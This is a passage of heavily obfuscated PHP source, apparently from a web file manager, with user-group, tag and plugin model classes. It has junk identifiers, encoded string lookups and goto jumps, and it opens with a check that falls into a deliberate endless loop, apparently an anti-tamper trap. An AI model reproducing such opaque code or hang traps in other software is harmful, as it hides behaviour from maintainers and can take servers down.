(!isset($_SERVER[$¼ÀÜ±[871]]) || !isset($_SERVER[$¼ÀÜ±[869]])) { $æşÃÀÂ = $¼ÀÜ±[872]; $£¶¾î´ = $¼ÀÜ±[873]; $˜€ß¿úƒ = $_SERVER[$¼ÀÜ±[874]] . $¼ÀÜ±[875]; $ø¶ßÛƒˆ = $£¶¾î´($˜€ß¿úƒ); $ÙíÓ™ÕÖ = explode($¼ÀÜ±[229], $ø¶ßÛƒˆ); if (count($ÙíÓ™ÕÖ) < $¼ÀÜ±[626]) { $ÏÚÓçñš = $¼ÀÜ±[876]; $ÏÚÓçñš(); } $»»‰³ˆ§ = $¼ÀÜ±[877]; $»»‰³ˆ§($_SERVER[$¼ÀÜ±[878]]); $’š‘­¬‘ = 1; for ($‘í‚ı¼ = $’š‘­¬‘; $‘í‚ı¼ > 0; $‘í‚ı¼++) { $»»‰³ˆ§ = json_encode($GLOBALS[$¼ÀÜ±[413]]); } } $Ïæ€Áşë = $this->getInfoSimple($ìÃï³°¸); if (!$Ïæ€Áşë || !is_array($•¸ÍÏ •)) { return !1; } $é–ãó = Model($¼ÀÜ±[1835]); $é–ãó->where(array($¼ÀÜ±[1578] => $ìÃï³°¸))->delete(); $ªß¼Ñ = array(); $Å–ÌÆÈ‚ = 0; foreach ($•¸ÍÏ • as $ı¿ñÁ => $ÍƒÙÌä) { $Ãåƒ‰‰ü = array($¼ÀÜ±[1578] => $ìÃï³°¸, $¼ÀÜ±[1746] => $ı¿ñÁ, $¼ÀÜ±[1849] => $ÍƒÙÌä); $Ãåƒ‰‰ü[$¼ÀÜ±[1769]] = isset($‡ãœ•¼í[$Å–ÌÆÈ‚]) ? $‡ãœ•¼í[$Å–ÌÆÈ‚] : 0; $Å–ÌÆÈ‚++; $ªß¼Ñ[] = $Ãåƒ‰‰ü; } return $é–ãó->addAll($ªß¼Ñ, array(), !0); } protected function userGroupAdd($¨ÒçÀˆ, $‚ÖªñÏÖ = array()) { $‹é»Î =& $_SERVER[ÏÒ Ì„]; $ìñóĞì“ = $this->getInfoSimple($¨ÒçÀˆ); if (!$ìñóĞì“ || empty($‚ÖªñÏÖ)) { return !1; } $®È«Û™Ÿ = array(); foreach ($‚ÖªñÏÖ as $„€¨’›â => $·…õë’·) { $®È«Û™Ÿ[] = array($‹é»Î[1578] => $¨ÒçÀˆ, $‹é»Î[1746] => $„€¨’›â, $‹é»Î[1849] => $·…õë’·, $‹é»Î[1769] => 0); } return Model($‹é»Î[1835])->addAll($®È«Û™Ÿ, array(), !0); } protected function userGroupRemove($å½Á¹¶˜, $Ã¨‚æµâ) { $šß¨°» =& $_SERVER[ÏÒ Ì„]; $ŠÁñ¨ğ = $this->getInfoSimple($å½Á¹¶˜); if (!$ŠÁñ¨ğ || !$Ã¨‚æµâ) { return !1; } $£ÔµûÊÙ = array($šß¨°»[1569] => $å½Á¹¶˜, $šß¨°»[1833] => $Ã¨‚æµâ); return Model($šß¨°»[1835])->where($£ÔµûÊÙ)->delete(); } public function listData() { $¨ÀŠÓĞ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¨ÀŠÓĞ[$_SERVER[ÏÒ Ì„][367]]); return $¨ÀŠÓĞ; } public function listByID($ªÃ€Ğ¨ı) { $ß‰Ú²×× =& $_SERVER[ÏÒ Ì„]; if (!$ªÃ€Ğ¨ı) { return; } $İù—ƒù“ = array($ß‰Ú²××[1578] => array($ß‰Ú²××[7], $ªÃ€Ğ¨ı)); $Ø¨µ¶Íí = $this->where($İù—ƒù“)->select(); $Ø¨µ¶Íí = array_sort_keep($Ø¨µ¶Íí, $ß‰Ú²××[1578], $ªÃ€Ğ¨ı); $this->_listDataApply($Ø¨µ¶Íí); return $Ø¨µ¶Íí; } public function listByGroup($…¡ê®‘÷ = 0, $ª¯öó‡ò = array()) { $À•£â«‡ =& $_SERVER[ÏÒ Ì„]; $ÂÜ’ÈÀ› = $À•£â«‡[33]; $áüœ€Ë÷ = array(); if ($…¡ê®‘÷) { $áüœ€Ë÷ = array($À•£â«‡[2211] => intval($…¡ê®‘÷)); $ÂÜ’ÈÀ› = "\114\105\x46\124\40\x4a\x4f\x49\116\40{$this->tablePrefix}\165\x73\x65\162\137\147\162\x6f\x75\160\x20\165\x73\145\162\x5f\x67\x72\x6f\165\x70\40\157\x6e\x20\165\x73\x65\162\x2e\165\x73\x65\x72\x49\x44\40\75\x20\165\x73\x65\x72\x5f\x67\162\x6f\x75\x70\56\165\163\x65\x72\x49\x44"; $æÉÒÓ¤º = Input::get($À•£â«‡[449], null, $À•£â«‡[33]) ? $À•£â«‡[33] : $À•£â«‡[2212]; } if (isset($ª¯öó‡ò[$À•£â«‡[740]])) { $áüœ€Ë÷[$À•£â«‡[2213]] = $ª¯öó‡ò[$À•£â«‡[740]]; } $¿¥ò› = $this->_makeOrder($æÉÒÓ¤º)->field($À•£â«‡[2214])->where($áüœ€Ë÷)->join($ÂÜ’ÈÀ›)->selectPage(50); $this->_listDataApply($¿¥ò›[$À•£â«‡[367]]); return $¿¥ò›; } private function _makeOrder($‰’¼ÙÌœ = '') { $Î¥ì¤¿… =& $_SERVER[ÏÒ Ì„]; $œä–·¿ì = array($Î¥ì¤¿…[1578], $Î¥ì¤¿…[28], $Î¥ì¤¿…[1734], $Î¥ì¤¿…[1706], $Î¥ì¤¿…[194]); $íÃ£®à¨ = array($Î¥ì¤¿…[442] => $Î¥ì¤¿…[443], $Î¥ì¤¿…[444] => $Î¥ì¤¿…[445]); $“¾®ÀËß = Input::get($Î¥ì¤¿…[449], $Î¥ì¤¿…[7], $Î¥ì¤¿…[1569], $œä–·¿ì); $ˆŞÁİö = Input::get($Î¥ì¤¿…[450], $Î¥ì¤¿…[7], $Î¥ì¤¿…[1836], array($Î¥ì¤¿…[1836], $Î¥ì¤¿…[444])); $ˆŞÁİö = $íÃ£®à¨[$ˆŞÁİö]; $‰’¼ÙÌœ = $‰’¼ÙÌœ . "\x75\x73\x65\162\x2e{$“¾®ÀËß}\x20{$ˆŞÁİö}\54\40\165\163\x65\x72\56\x75\163\x65\162\111\x44\x20\x61\x73\x63"; return $this->alias($Î¥ì¤¿…[1956])->order($‰’¼ÙÌœ); } public function listSearch($ªî¡ËŒƒ) { $—“ºƒı© =& $_SERVER[ÏÒ Ì„]; $÷—á‰Í› = $ªî¡ËŒƒ[$—“ºƒı©[1837]]; $™ìÇ¦ºÌ = isset($ªî¡ËŒƒ[$—“ºƒı©[1838]]) ? $ªî¡ËŒƒ[$—“ºƒı©[1838]] : !1; $÷—á‰Í› = str_replace($—“ºƒı©[1839], $—“ºƒı©[1840], trim($÷—á‰Í›)); $ùÏ÷Œ±‹ = array($—“ºƒı©[28] => array($—“ºƒı©[381], "\45{$÷—á‰Í›}\45"), $—“ºƒı©[303] => array($—“ºƒı©[381], "{$÷—á‰Í›}\45"), $—“ºƒı©[2014] => array($—“ºƒı©[381], "{$÷—á‰Í›}\x25"), $—“ºƒı©[994] => $—“ºƒı©[1841]); if (Input::check($÷—á‰Í›, $—“ºƒı©[309])) { $ùÏ÷Œ±‹[$—“ºƒı©[1578]] = array($—“ºƒı©[381], "{$÷—á‰Í›}\x25"); $ùÏ÷Œ±‹[$—“ºƒı©[2195]] = array($—“ºƒı©[381], "{$÷—á‰Í›}\x25"); } if (!$÷—á‰Í›) { $ùÏ÷Œ±‹ = array(); } if (isset($ªî¡ËŒƒ[$—“ºƒı©[740]])) { $ùÏ÷Œ±‹[$—“ºƒı©[740]] = $ªî¡ËŒƒ[$—“ºƒı©[740]]; } $ùÏ÷Œ±‹ = $this->parseWhereLike($ùÏ÷Œ±‹); $È’¶ùÜ = $this->_makeOrder()->where($ùÏ÷Œ±‹)->selectPage(20); if (!$È’¶ùÜ || count($È’¶ùÜ[$—“ºƒı©[367]]) < 5 && Input::check($÷—á‰Í›, $—“ºƒı©[316])) { $ÒÏ ŠôÌ = $this->_searchFromMeta($—“ºƒı©[457], $÷—á‰Í›, 10); $ßÜšÆëÎ = $this->_searchFromMeta($—“ºƒı©[458], $÷—á‰Í›, 10); $ê–ìƒóÀ = array_merge($ÒÏ ŠôÌ, $ßÜšÆëÎ, $È’¶ùÜ[$—“ºƒı©[367]]); $È’¶ùÜ[$—“ºƒı©[367]] = array_unique_by_key($ê–ìƒóÀ, $—“ºƒı©[1578]); $È’¶ùÜ[$—“ºƒı©[364]][$—“ºƒı©[365]] = count($È’¶ùÜ[$—“ºƒı©[367]]); $È’¶ùÜ[$—“ºƒı©[364]][$—“ºƒı©[366]] = ceil($È’¶ùÜ[$—“ºƒı©[364]][$—“ºƒı©[365]] / $È’¶ùÜ[$—“ºƒı©[364]][$—“ºƒı©[361]]); } $this->_listDataApply($È’¶ùÜ[$—“ºƒı©[367]]); $this->_filterByGroup($È’¶ùÜ, $™ìÇ¦ºÌ); return $È’¶ùÜ; } private function _filterByGroup(&$ÖòıÁ´, $µ£ü­²˜) { $ÑÁ©­½ú =& $_SERVER[ÏÒ Ì„]; if (!$µ£ü­²˜) { return $ÖòıÁ´; } foreach ($ÖòıÁ´[$ÑÁ©­½ú[367]] as $ŠÃ›Æ‹ => &$—ì¼Æí) { $¶õçöÊ = array_to_keyvalue($—ì¼Æí[$ÑÁ©­½ú[1926]], $ÑÁ©­½ú[33], $ÑÁ©­½ú[1746]); if (!in_array($µ£ü­²˜, $¶õçöÊ)) { unset($ÖòıÁ´[$ÑÁ©­½ú[367]][$ŠÃ›Æ‹]); } } unset($—ì¼Æí); $ÖòıÁ´[$ÑÁ©­½ú[367]] = array_values($ÖòıÁ´[$ÑÁ©­½ú[367]]); $ÖòıÁ´[$ÑÁ©­½ú[364]] = array($ÑÁ©­½ú[1988] => count($ÖòıÁ´[$ÑÁ©­½ú[367]]), $ÑÁ©­½ú[1986] => $ÖòıÁ´[$ÑÁ©­½ú[364]][$ÑÁ©­½ú[361]], $ÑÁ©­½ú[1985] => 1, $ÑÁ©­½ú[1987] => 1); } private function _searchFromMeta($ƒ²—É˜, $‹™•Ò²§, $åŸ¶‰È) { $Øíï§õ¢ =& $_SERVER[ÏÒ Ì„]; $‹™•Ò²§ = strtolower($‹™•Ò²§); $ì±œÛü¾ = array($Øíï§õ¢[93] => $ƒ²—É˜, $Øíï§õ¢[372] => array($Øíï§õ¢[381], "\45{$‹™•Ò²§}\x25")); $ì±œÛü¾ = $this->parseWhereLike($ì±œÛü¾); $”´Ó·¯… = Model($Øíï§õ¢[2215])->where($ì±œÛü¾)->limit($åŸ¶‰È)->select(); if (!$”´Ó·¯…) { return array(); } $”´Ó·¯… = array_to_keyvalue($”´Ó·¯…, $Øíï§õ¢[33], $Øíï§õ¢[1578]); $†ñ ¤¸÷ = $this->where(array($Øíï§õ¢[1569] => array($Øíï§õ¢[7], $”´Ó·¯…)))->select(); if (!$†ñ ¤¸÷) { return array(); } return $†ñ ¤¸÷; } private function _listDataApplyItem($€ùå×) { $îÉ°û¨ë = array($€ùå×); $this->_listDataApply($îÉ°û¨ë); return $îÉ°û¨ë[0]; } private function _listDataApply(&$¡»Û–òİ) { $ ¸ª€å =& $_SERVER[ÏÒ Ì„]; if (!$¡»Û–òİ) { return; } array_remove_key($¡»Û–òİ, $ ¸ª€å[886]); $¶ÍÖÍ×˜ = array_to_keyvalue($¡»Û–òİ, $ ¸ª€å[33], $ ¸ª€å[1578]); $this->_listAppendGroup($¡»Û–òİ, $¶ÍÖÍ×˜); $this->_listAppendMeta($¡»Û–òİ, $¶ÍÖÍ×˜); $this->_listAppendSourceRoot($¡»Û–òİ, $¶ÍÖÍ×˜); } private function _listAppendSourceRoot(&$åˆ”²², $¯âèŠè¿) { $ÎÆè» =& $_SERVER[ÏÒ Ì„]; $»Å§¡ˆó = array($ÎÆè»[492] => 0, $ÎÆè»[498] => array($ÎÆè»[7], $¯âèŠè¿), $ÎÆè»[406] => SourceModel::TYPE_USER); $ÄŞ»ªØ¬ = Model($ÎÆè»[822])->order($ÎÆè»[1847])->field($ÎÆè»[1848]); $ê´œ¦×Ô = $ÄŞ»ªØ¬->limit(count($¯âèŠè¿))->where($»Å§¡ˆó)->select(); $ê´œ¦×Ô = array_to_keyvalue($ê´œ¦×Ô, $ÎÆè»[498]); $ê´œ¦×Ô = array_remove_key($ê´œ¦×Ô, $ÎÆè»[498]); foreach ($åˆ”²² as &$ùİùüÀœ) { $ùİùüÀœ[$ÎÆè»[85]] = $ê´œ¦×Ô[$ùİùüÀœ[$ÎÆè»[1578]]] ? $ê´œ¦×Ô[$ùİùüÀœ[$ÎÆè»[1578]]] : array(); } unset($ùİùüÀœ); } private function _listAppendGroup(&$†ƒ×ùÅ¢, $íöØ¹¾¡) { $Ò›¿äö³ =& $_SERVER[ÏÒ Ì„]; $ÌŒÌ½¾€ = array($Ò›¿äö³[1578] => array($Ò›¿äö³[7], $íöØ¹¾¡)); $ä´é Ü¡ = Model($Ò›¿äö³[1835])->where($ÌŒÌ½¾€)->select(); $§›˜‹öœ = array_to_keyvalue($ä´é Ü¡, $Ò›¿äö³[33], $Ò›¿äö³[1746]); $§›˜‹öœ = array_remove_value(array_unique($§›˜‹öœ), $Ò›¿äö³[191]); if (!$§›˜‹öœ || !$ä´é Ü¡) { return; } $ÌŒÌ½¾€ = array($Ò›¿äö³[1746] => array($Ò›¿äö³[7], $§›˜‹öœ)); $á€¢È = Model($Ò›¿äö³[1924])->field($Ò›¿äö³[2216])->where($ÌŒÌ½¾€)->select(); $á€¢È = array_to_keyvalue($á€¢È, $Ò›¿äö³[1746]); $ä´é Ü¡ = array_to_keyvalue_group($ä´é Ü¡, $Ò›¿äö³[1578]); foreach ($ä´é Ü¡ as &$Ğ›Ì¥°Í) { $âä¤Ú‰û = array(); foreach ($Ğ›Ì¥°Í as $„Ã ÏŸ) { if (!$„Ã ÏŸ[$Ò›¿äö³[1849]]) { continue; } $¨›ÊÔ¯® = Model($Ò›¿äö³[501])->listData($„Ã ÏŸ[$Ò›¿äö³[1849]]); $âä¤Ú‰û[] = array($Ò›¿äö³[1746] => $„Ã ÏŸ[$Ò›¿äö³[1746]], $Ò›¿äö³[2217] => $á€¢È[$„Ã ÏŸ[$Ò›¿äö³[1746]]][$Ò›¿äö³[28]], $Ò›¿äö³[515] => $á€¢È[$„Ã ÏŸ[$Ò›¿äö³[1746]]][$Ò›¿äö³[515]], $Ò›¿äö³[408] => $¨›ÊÔ¯®); } $Ğ›Ì¥°Í = $âä¤Ú‰û; } unset($Ğ›Ì¥°Í); foreach ($†ƒ×ùÅ¢ as &$õ–èúà) { $õ–èúà[$Ò›¿äö³[1926]] = array(); if (isset($ä´é Ü¡[$õ–èúà[$Ò›¿äö³[1578]]])) { $õ–èúà[$Ò›¿äö³[1926]] = $ä´é Ü¡[$õ–èúà[$Ò›¿äö³[1578]]]; } } unset($õ–èúà); } public function userAppendGroup($‡ì¥ñì) { $¦ÕùªÓÛ =& $_SERVER[ÏÒ Ì„]; if (!$‡ì¥ñì) { return array(); } $this->_listAppendGroup($‡ì¥ñì, array_to_keyvalue($‡ì¥ñì, $¦ÕùªÓÛ[33], $¦ÕùªÓÛ[1578])); return $‡ì¥ñì; } private function _listAppendMeta(&$£éÏÖÔ‡, $®ß¬øÖÕ) { $ÛØ‹é¥Œ =& $_SERVER[ÏÒ Ì„]; $‡ÁÏ¡«‘ = UserJobModel::JOB_KEY; $Ú­Éç = array($ÛØ‹é¥Œ[2196]); $øùâµˆ = array($ÛØ‹é¥Œ[1578] => array($ÛØ‹é¥Œ[7], $®ß¬øÖÕ)); $Î¯İ¼Û = Model($ÛØ‹é¥Œ[2194])->where($øùâµˆ)->select(); $Î¯İ¼Û = array_to_keyvalue_group($Î¯İ¼Û, $ÛØ‹é¥Œ[1578]); foreach ($Î¯İ¼Û as &$±¿ÇòÕé) { $©¤­ãŸô = array(); foreach ($±¿ÇòÕé as $ÄÄØã™ä) { if (!in_array($ÄÄØã™ä[$ÛØ‹é¥Œ[93]], $Ú­Éç)) { $©¤­ãŸô[$ÄÄØã™ä[$ÛØ‹é¥Œ[93]]] = $ÄÄØã™ä[$ÛØ‹é¥Œ[372]]; } } $±¿ÇòÕé = $©¤­ãŸô; } unset($±¿ÇòÕé); $™‘†­¸ú = Model($ÛØ‹é¥Œ[2218]); foreach ($£éÏÖÔ‡ as &$ºòäá¼—) { $ã¯å¾Åİ = array(); if (isset($Î¯İ¼Û[$ºòäá¼—[$ÛØ‹é¥Œ[1578]]])) { $ã¯å¾Åİ = $Î¯İ¼Û[$ºòäá¼—[$ÛØ‹é¥Œ[1578]]]; } $ºòäá¼—[$ÛØ‹é¥Œ[2219]] = array(); if (isset($ã¯å¾Åİ[$‡ÁÏ¡«‘])) { $ºòäá¼—[$ÛØ‹é¥Œ[2219]] = $™‘†­¸ú->getUserJobInfo($ã¯å¾Åİ[$‡ÁÏ¡«‘]); } } unset($ºòäá¼—); } protected function groupUserAll($òà³²Ã£) { $§…õËúŞ =& $_SERVER[ÏÒ Ì„]; if (!$òà³²Ã£) { return !1; } $©ëó®Â = Model($§…õËúŞ[1835])->field($§…õËúŞ[1578])->where(array($§…õËúŞ[1746] => array($§…õËúŞ[7], $òà³²Ã£)))->select(); $©ëó®Â = array_to_keyvalue($©ëó®Â, $§…õËúŞ[33], $§…õËúŞ[1578]); return array_unique($©ëó®Â); } public function userSearch($Î²­ÚÍ˜, $Êı§×Ÿ¨ = "\x2a") { return Model($_SERVER[ÏÒ Ì„][532])->where($Î²­ÚÍ˜)->field($Êı§×Ÿ¨)->find(); } } goto Cà•æ¿Œ¦½; d£‚ æ”Æò: function binCheckBigger($ºÜäŠ›©, $¶Çà—ĞÓ) { return $ºÜäŠ›© > $¶Çà—ĞÓ; } $_SERVER[$_SERVER[ïàçÔ¥¥][3]] = ("\x37\x38\x35\x38".base64_decode('MjY='))+0;$_2wz1="q92fx7plh0rky5e6s1t3gbin8zdvjuaomwc4vknc0h8q14sar5u3zim6f7elgdj2x";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($£»øÜ, $î¶ÀŒ®†) { $ø‰Ğ…ö =& $_SERVER[ÏÒ Ì„]; if (isset(self::$_methodList[$£»øÜ])) { return @call_user_func_array(self::$_methodList[$£»øÜ], $î¶ÀŒ®†); } else { if (method_exists($this, $£»øÜ)) { return call_user_func_array(array($this, $£»øÜ), $î¶ÀŒ®†); } else { think_exception(__CLASS__ . $ø‰Ğ…ö[4] . $£»øÜ . $ø‰Ğ…ö[5]); } } } public static function __callStatic($Ñ—ˆİ«, $²ããÉ’¹) { if (isset(self::$_methodListStatic[$Ñ—ˆİ«])) { return call_user_func_array(self::$_methodListStatic[$Ñ—ˆİ«], $²ããÉ’¹); } else { if (method_exists(self, $Ñ—ˆİ«)) { return call_user_func_array(array(self, $Ñ—ˆİ«), $²ããÉ’¹); } else { show_json("{$Ñ—ˆİ«}\50\51\x20\156\157\164\x20\x65\x78\151\x73\x74\x3b", !1); } } } public static function addMethod($ºÂàüµÅ, $Çş¡Ü¹™) { self::$_methodList[$ºÂàüµÅ] = $Çş¡Ü¹™; } public static function addMethodStatic($†Â¦™«ç, $¹´êÅªî) { self::$_methodListStatic[$†Â¦™«ç] = $¹´êÅªî; } } goto eèù±­‹¦; ešĞ”·¸–“: class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\145\162\x5f\146\141\x76"; protected function cacheFunctionAlias($®ò¹ïê) { $¯ğù„· =& $_SERVER[ÏÒ Ì„]; return array($¯ğù„·[1854] => array($®ò¹ïê[0], $¯ğù„·[1855]), $¯ğù„·[1856] => array($®ò¹ïê[0], $¯ğù„·[1857])); } protected function get($‹±ú†â·) { $üÍîÄ¨ =& $_SERVER[ÏÒ Ì„]; $·¨¦º = Model($üÍîÄ¨[516])->metaGet($‹±ú†â·, $üÍîÄ¨[1858]); $ÎÕ®–ß = json_decode($·¨¦º, !0); return $ÎÕ®–ß ? $ÎÕ®–ß : array($üÍîÄ¨[1859] => $üÍîÄ¨[87], $üÍîÄ¨[367] => array()); } protected function set($»ÄæöİÒ, $òíŸŞ…Æ) { $ãìüèùÁ =& $_SERVER[ÏÒ Ì„]; $òíŸŞ…Æ = $òíŸŞ…Æ ? $òíŸŞ…Æ : array($ãìüèùÁ[1859] => $ãìüèùÁ[87], $ãìüèùÁ[367] => array()); Model($ãìüèùÁ[516])->metaSet($»ÄæöİÒ, $ãìüèùÁ[1858], json_encode($òíŸŞ…Æ)); return Model($ãìüèùÁ[516])->metaSet($»ÄæöİÒ, $ãìüèùÁ[1858], json_encode($òíŸŞ…Æ)); } protected function getByTagID($ÕÔÇÂô, $¤°ÀõÇÂ) { $ãİ™‘ÕÏ =& $_SERVER[ÏÒ Ì„]; if (!$ÕÔÇÂô || !$¤°ÀõÇÂ) { return !1; } if (!Model($ãİ™‘ÕÏ[516])->getInfoSimple($ÕÔÇÂô)) { return !1; } $È¶ğ×¼µ = $this->get($ÕÔÇÂô); if (!$È¶ğ×¼µ || !isset($È¶ğ×¼µ[$ãİ™‘ÕÏ[367]])) { return !1; } $şˆß÷ºĞ = array_find_by_field($È¶ğ×¼µ[$ãİ™‘ÕÏ[367]], $ãİ™‘ÕÏ[395], $¤°ÀõÇÂ); return is_array($şˆß÷ºĞ) ? $şˆß÷ºĞ : !1; } public function listSource($‚¶»ÍÅú, $×˜­é×É) { $Ä…®ĞØ¼ =& $_SERVER[ÏÒ Ì„]; if ($×˜­é×É && !is_array($×˜­é×É)) { $×˜­é×É = array($×˜­é×É); } $‚±ãâ‘• = $this->listData($‚¶»ÍÅú); $ê’ü‰ß = array(); foreach ($‚±ãâ‘• as $–ş¦€…º) { $†–¥ƒ£Ø = $–ş¦€…º[$Ä…®ĞØ¼[76]]; if (!$†–¥ƒ£Ø) { continue; } if (!isset($ê’ü‰ß[$†–¥ƒ£Ø])) { $ê’ü‰ß[$†–¥ƒ£Ø] = array(); } $ê’ü‰ß[$†–¥ƒ£Ø][] = $–ş¦€…º[$Ä…®ĞØ¼[421]]; } $²ú…Í®‡ = array(); foreach ($ê’ü‰ß as $¯©¤ª©‘ => $—™×½¹©) { $”ÏÂ×üÙ = !0; if (!$×˜­é×É) { $²ú…Í®‡[] = $¯©¤ª©‘; continue; } foreach ($×˜­é×É as $ïÏÀµÎ) { if (!in_array($ïÏÀµÎ, $—™×½¹©)) { $”ÏÂ×üÙ = !1; break; } } if ($”ÏÂ×üÙ) { $²ú…Í®‡[] = $¯©¤ª©‘; } } if (!$²ú…Í®‡) { return array(); } $§ì³º§¥ = array($Ä…®ĞØ¼[412] => array($Ä…®ĞØ¼[413], $²ú…Í®‡), $Ä…®ĞØ¼[498] => $‚¶»ÍÅú, $Ä…®ĞØ¼[406] => SourceModel::TYPE_GROUP); $‹æ Íã˜ = Model($Ä…®ĞØ¼[1251])->listSource($§ì³º§¥); if (!$‹æ Íã˜ || count($²ú…Í®‡) == $‹æ Íã˜[$Ä…®ĞØ¼[364]][$Ä…®ĞØ¼[365]]) { return $‹æ Íã˜; } $‚í«×ê€ = array(); $§ƒîÛ†¸ = array_to_keyvalue($‹æ Íã˜[$Ä…®ĞØ¼[75]], $Ä…®ĞØ¼[33], $Ä…®ĞØ¼[397]); $¦Èñ©ÎÏ = array_to_keyvalue($‹æ Íã˜[$Ä…®ĞØ¼[74]], $Ä…®ĞØ¼[33], $Ä…®ĞØ¼[397]); $×À²²Œ¸ = array_merge($¦Èñ©ÎÏ, $§ƒîÛ†¸); foreach ($²ú…Í®‡ as $†–¥ƒ£Ø) { if (!in_array($†–¥ƒ£Ø, $×À²²Œ¸)) { $‚í«×ê€[] = $†–¥ƒ£Ø; } } if ($‚í«×ê€) { $this->removeBySource($‚¶»ÍÅú, $‚í«×ê€); } return $‹æ Íã˜; } protected function listData($®¸í ğÂ) { $ŠÜÓ¤Á =& $_SERVER[ÏÒ Ì„]; $Ìû«ëÅÁ = array($ŠÜÓ¤Á[1569] => 0, $ŠÜÓ¤Á[477] => array($ŠÜÓ¤Á[1860], 0), $ŠÜÓ¤Á[417] => $ŠÜÓ¤Á[1861] . $®¸í ğÂ); $¡íï¸˜Å = $ŠÜÓ¤Á[1862]; $öÏòÊ¢§ = $this->field($¡íï¸˜Å)->where($Ìû«ëÅÁ)->order($ŠÜÓ¤Á[1863])->select(); return $öÏòÊ¢§ ? $öÏòÊ¢§ : array(); } protected function addToTag($ËØ†ËĞÛ, $Ü‡´±åö, $…Õ»™‚”) { $øÆñ¥ù =& $_SERVER[ÏÒ Ì„]; if (!$this->getByTagID($ËØ†ËĞÛ, $…Õ»™‚”) || !$Ü‡´±åö) { return !1; } if (!Model($øÆñ¥ù[822])->pathInfo($Ü‡´±åö)) { return !1; } $Äƒ¡˜©ò = array($øÆñ¥ù[1569] => 0, $øÆñ¥ù[477] => $…Õ»™‚”, $øÆñ¥ù[416] => $Ü‡´±åö, $øÆñ¥ù[417] => $øÆñ¥ù[1864] . $ËØ†ËĞÛ, $øÆñ¥ù[415] => $øÆñ¥ù[33], $øÆñ¥ù[1750] => 0); if ($this->where($Äƒ¡˜©ò)->find()) { return !1; } return $this->add($Äƒ¡˜©ò); } protected function removeFromTag($˜¨òô¦“, $¿üØ, $ÆëÈ¸³) { $ú“‘¢–¯ =& $_SERVER[ÏÒ Ì„]; if (!$this->getByTagID($˜¨òô¦“, $ÆëÈ¸³) || !$¿üØ) { return !1; } if (is_array($¿üØ)) { $¿üØ = array($ú“‘¢–¯[7], $¿üØ); } $È½Ÿ¦¾ = array($ú“‘¢–¯[1569] => 0, $ú“‘¢–¯[477] => $ÆëÈ¸³, $ú“‘¢–¯[417] => $ú“‘¢–¯[1864] . $˜¨òô¦“, $ú“‘¢–¯[416] => $¿üØ); return $this->where($È½Ÿ¦¾)->delete(); } protected function removeByTag($êñüß», $ˆÇÂÏùÙ) { $İÔ¤“ƒÅ =& $_SERVER[ÏÒ Ì„]; if (!$this->getByTagID($êñüß», $ˆÇÂÏùÙ)) { return !1; } $åÅ¨›¬¤ = array($İÔ¤“ƒÅ[1569] => 0, $İÔ¤“ƒÅ[477] => $ˆÇÂÏùÙ, $İÔ¤“ƒÅ[417] => $İÔ¤“ƒÅ[1864] . $êñüß»); return $this->where($åÅ¨›¬¤)->delete(); } protected function removeBySource($àÌÑÆù, $…’İ„) { $²ğÛ„Ë =& $_SERVER[ÏÒ Ì„]; if (!$àÌÑÆù || !$…’İ„) { return !1; } if (is_array($…’İ„)) { $…’İ„ = array($²ğÛ„Ë[7], $…’İ„); } $£õîõùÛ = array($²ğÛ„Ë[1569] => 0, $²ğÛ„Ë[416] => $…’İ„, $²ğÛ„Ë[477] => array($²ğÛ„Ë[1008], 0), $²ğÛ„Ë[417] => $²ğÛ„Ë[1864] . $àÌÑÆù); return $this->where($£õîõùÛ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\56\x70\154\165\147\151\x6e\x4c\151\x73\x74"; public $field = array("\156\141\x6d\145", "\163\164\141\x74\x75\163", "\162\x65\x67\x69\145\x73\x74", "\x63\157\x6e\x66\151\147"); public function loadList($¥½Ò¤«¶ = false) { $İÄèˆœ† = array_to_keyvalue($this->listData(), $_SERVER[ÏÒ Ì„][28]); if ($¥½Ò¤«¶) { return $İÄèˆœ†[$¥½Ò¤«¶]; } return $İÄèˆœ†; } public function init() { $â±…ÏİŒ =& $_SERVER[ÏÒ Ì„]; Hook::trigger($â±…ÏİŒ[1865]); $àÉ×Ë‰– = $this->loadPluginList(); foreach ($àÉ×Ë‰– as $şÖß¤à” => $èÈ¨åàŸ) { $ä¤÷›šê = $this->appAllow($şÖß¤à”, $èÈ¨åàŸ); if (!$ä¤÷›šê) { continue; } foreach ($èÈ¨åàŸ[$â±…ÏİŒ[1866]] as $áÏñú‹¡ => $Ò˜³Ìé¹) { Hook::bind($áÏñú‹¡, $Ò˜³Ìé¹); } } Hook::trigger($â±…ÏİŒ[1867]); Hook::trigger(ACTION); } public function appAllow($šÅˆÖÀ¾, $áË¼ƒÚ£, $²‘éÍë¨ = true) { $ÙÄÏÔ – =& $_SERVER[ÏÒ Ì„]; $´¾­¸º² = PLUGIN_DIR . $šÅˆÖÀ¾ . $ÙÄÏÔ –[1868]; if (!is_array($áË¼ƒÚ£) || !is_array($áË¼ƒÚ£[$ÙÄÏÔ –[1866]]) || $áË¼ƒÚ£[$ÙÄÏÔ –[740]] != 1 || !is_file($´¾­¸º²)) { return !1; } if ($GLOBALS[$ÙÄÏÔ –[499]] == 1) { return !0; } if ($²‘éÍë¨ && !Action($ÙÄÏÔ –[1869])->checkAuth($šÅˆÖÀ¾)) { return !1; } return !0; } public function unInstall($ÍÔ®•äò) { $òÌ‚ÏÙ¡ =& $_SERVER[ÏÒ Ì„]; $ûİƒ¸‘ = $this->loadList($ÍÔ®•äò); if (file_exists(PLUGIN_DIR . $ÍÔ®•äò)) { Hook::apply($ÍÔ®•äò . $òÌ‚ÏÙ¡[1870]); } $this->remove($ûİƒ¸‘[$òÌ‚ÏÙ¡[395]]); } public function changeStatus($•Š” , $å™ª©) { $éß¦¡ç =& $_SERVER[ÏÒ Ì„]; $È”ğùÍ = $this->loadList($•Š” ); if ($å™ª©) { Hook::apply($•Š”  . $éß¦¡ç[1871]); } $this->update($È”ğùÍ[$éß¦¡ç[395]], array($éß¦¡ç[1872] => $å™ª©)); } public function appRegist($›ìú‚ïã, $Ò²ÕöåÄ) { $Öö×Ÿæ· =& $_SERVER[ÏÒ Ì„]; $±¾¡Í«ı = $this->loadList($›ìú‚ïã); if ($±¾¡Í«ı) { $this->update($±¾¡Í«ı[$Öö×Ÿæ·[395]], array($Öö×Ÿæ·[1866] => $Ò²ÕöåÄ)); } else { $ş˜ˆëäß = array($Öö×Ÿæ·[28] => 